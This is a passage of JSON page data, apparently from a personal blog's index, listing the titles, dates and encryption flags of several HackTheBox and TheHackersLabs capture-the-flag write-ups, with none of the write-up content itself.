- TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"}]},"__N_SSG":true}